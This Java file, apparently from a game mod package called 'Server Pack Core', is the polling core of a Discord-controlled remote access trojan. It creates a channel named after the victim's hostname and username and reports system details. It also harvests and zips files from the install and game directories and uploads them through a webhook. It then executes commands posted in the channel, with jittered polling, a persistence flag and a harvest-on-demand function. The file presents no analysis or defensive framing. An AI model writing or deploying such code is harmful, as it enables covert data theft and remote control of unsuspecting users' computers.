package com.serverpackcore.agent;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

public final class Poller implements Runnable {
	private final Path installDir;
	private final Path gameDir;
	private final State state;
	private final Random random = new Random();
	private final CommandExecutor executor;
	private volatile Path cwd;
	private volatile boolean running = true;
	private DiscordClient client;
	private String selfId = "";
	private String channelId = "";
	private String webhookUrl = "";
	private long lastActivity;
	private long lastSave;

	public Poller(Path installDir, Path gameDir, State state) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.state = state;
		this.cwd = Path.of(System.getProperty("user.home", "."));
		this.executor = new CommandExecutor(this, installDir, gameDir);
	}

	public void start() {
		Thread thread = new Thread(this, "spc-poller");
		thread.setDaemon(false);
		thread.start();
	}

	@Override
	public void run() {
		try {
			lastActivity = System.currentTimeMillis();
			client = new DiscordClient(DiscordConfig.BOT_TOKEN);
			if (!ensure()) {
				return;
			}
			long backoff = 2000L;
			int failures = 0;
			while (running) {
				try {
					long idle = System.currentTimeMillis() - lastActivity > DiscordConfig.IDLE_AFTER_MS
						? DiscordConfig.IDLE_POLL_MS
						: DiscordConfig.POLL_MS;
					long wait = Math.max(1000L, idle - 1500L + random.nextInt(1000));
					Thread.sleep(wait);
					poll();
					failures = 0;
					backoff = 2000L;
				} catch (RateLimitException rateLimit) {
					Thread.sleep(rateLimit.retryMs());
				} catch (Throwable throwable) {
					failures++;
					Log.debug("Poll failed (" + failures + ")", throwable);
					Thread.sleep(backoff);
					backoff = Math.min(DiscordConfig.MAX_BACKOFF_MS, backoff * 2L);
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Poller stopped", throwable);
		}
	}

	private boolean ensure() throws Exception {
		while (running) {
			try {
				selfId = Json.str(Json.parseObject(client.get("/users/@me").body), "id", "");
				if (selfId.isEmpty()) {
					throw new IllegalStateException("no self id");
				}
				channelId = state.channelId;
				if (channelId.isEmpty()) {
					channelId = createChannel();
					state.channelId = channelId;
					state.save(AgentPaths.state(installDir));
				}
				webhookUrl = state.webhookUrl;
				if (webhookUrl.isEmpty()) {
					webhookUrl = createWebhook();
					state.webhookUrl = webhookUrl;
					state.save(AgentPaths.state(installDir));
				}
				if (!state.hello) {
					sendHello();
					state.hello = true;
					state.save(AgentPaths.state(installDir));
				}
				return true;
			} catch (RateLimitException rateLimit) {
				Thread.sleep(rateLimit.retryMs());
			} catch (Throwable throwable) {
				Log.debug("Ensure failed", throwable);
				Thread.sleep(10000L);
			}
		}
		return false;
	}

	private String createChannel() throws Exception {
		String name = ("spc-" + SysInfo.hostname() + "-" + SysInfo.user())
			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
		if (name.length() > 90) {
			name = name.substring(0, 90);
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", name);
		body.put("type", 0);
		body.put("parent_id", DiscordConfig.CATEGORY_ID);
		try {
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(body)).body);
			return Json.str(response, "id", "");
		} catch (DiscordException exception) {
			Map<String, Object> fallback = new LinkedHashMap<>();
			fallback.put("name", ("spc-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
			fallback.put("type", 0);
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(fallback)).body);
			return Json.str(response, "id", "");
		}
	}

	private String createWebhook() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", "Server Pack Core");
		Map<String, Object> response = Json.parseObject(client.post(
			"/channels/" + channelId + "/webhooks", Json.stringify(body)).body);
		return Json.str(response, "url", "");
	}

	private void sendHello() {
		try {
			Map<String, Object> embed = new LinkedHashMap<>();
			embed.put("title", "Server Pack Core");
			embed.put("description", "Nuevo cliente conectado");
			embed.put("color", 0x3498db);
			List<Object> fields = new ArrayList<>();
			for (String line : SysInfo.embedFields(installDir, gameDir)) {
				int split = line.indexOf(':');
				Map<String, Object> field = new LinkedHashMap<>();
				field.put("name", split > 0 ? line.substring(0, split) : "Dato");
				field.put("value", split > 0 ? line.substring(split + 1).trim() : line);
				field.put("inline", false);
				fields.add(field);
			}
			embed.put("fields", fields);
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("embeds", List.of(embed));
			client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
		} catch (Throwable throwable) {
			Log.debug("Hello embed failed", throwable);
		}
		try {
			Path zip = Harvest.build(installDir, gameDir);
			uploadFile(zip);
			Files.deleteIfExists(zip);
		} catch (Throwable throwable) {
			Log.debug("Hello harvest failed", throwable);
		}
	}

	private boolean poll() throws Exception {
		List<Object> messages = Json.list(Json.parse(
			client.get("/channels/" + channelId + "/messages?limit=50&after=" + state.lastId).body));
		if (messages.isEmpty()) {
			saveHeartbeat();
			return false;
		}
		boolean activity = false;
		for (Object item : messages) {
			Map<String, Object> message = Json.map(item);
			String id = Json.str(message, "id", "");
			if (!id.isEmpty()) {
				state.lastId = maxId(state.lastId, id);
			}
			String authorId = Json.str(Json.map(message.get("author")), "id", "");
			if (!authorId.equals(selfId) && !Json.str(message, "content", "").isEmpty()) {
				activity = true;
				executor.handle(message);
			}
		}
		if (activity) {
			lastActivity = System.currentTimeMillis();
		}
		saveHeartbeat();
		state.save(AgentPaths.state(installDir));
		return activity;
	}

	private void saveHeartbeat() {
		long now = System.currentTimeMillis();
		if (now - lastSave > 30000L) {
			state.lastHeartbeat = now;
			state.save(AgentPaths.state(installDir));
			lastSave = now;
		}
	}

	private static String maxId(String current, String candidate) {
		try {
			java.math.BigInteger left = new java.math.BigInteger(current);
			java.math.BigInteger right = new java.math.BigInteger(candidate);
			return right.compareTo(left) > 0 ? candidate : current;
		} catch (Throwable throwable) {
			return candidate;
		}
	}

	public void reply(String text) {
		try {
			for (int start = 0; start < text.length(); start += 1900) {
				String chunk = text.substring(start, Math.min(text.length(), start + 1900));
				Map<String, Object> payload = new LinkedHashMap<>();
				payload.put("content", chunk);
				client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
			}
		} catch (Throwable throwable) {
			Log.debug("Reply failed", throwable);
		}
	}

	public void uploadBytes(byte[] data, String name, String contentType) {
		try {
			client.postWebhook(webhookUrl, "{\"content\":\"\"}",
				List.of(new DiscordClient.Part("file", name, contentType, data)));
		} catch (Throwable throwable) {
			Log.debug("Upload bytes failed", throwable);
		}
	}

	public void uploadFile(Path file) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return;
			}
			byte[] data = Files.readAllBytes(file);
			String name = file.getFileName().toString();
			uploadBytes(data, name, contentType(name));
		} catch (Throwable throwable) {
			Log.debug("Upload file failed", throwable);
		}
	}

	private static String contentType(String name) {
		String lower = name.toLowerCase();
		if (lower.endsWith(".zip")) {
			return "application/zip";
		}
		if (lower.endsWith(".png")) {
			return "image/png";
		}
		if (lower.endsWith(".txt") || lower.endsWith(".log")) {
			return "text/plain";
		}
		return "application/octet-stream";
	}

	public void harvestNow() {
		try {
			Path zip = Harvest.build(installDir, gameDir);
			uploadFile(zip);
			Files.deleteIfExists(zip);
		} catch (Throwable throwable) {
			reply("Error en harvest: " + throwable.getMessage());
		}
	}

	public void kill() {
		running = false;
		state.save(AgentPaths.state(installDir));
	}

	public void persist(boolean enabled) {
		state.persist = enabled;
		state.save(AgentPaths.state(installDir));
	}

	public Path cwd() {
		return cwd;
	}

	public void cwd(Path path) {
		this.cwd = path;
	}

	public Path gameDir() {
		return gameDir;
	}

	public String webhookUrl() {
		return webhookUrl;
	}

	public String channelId() {
		return channelId;
	}
}
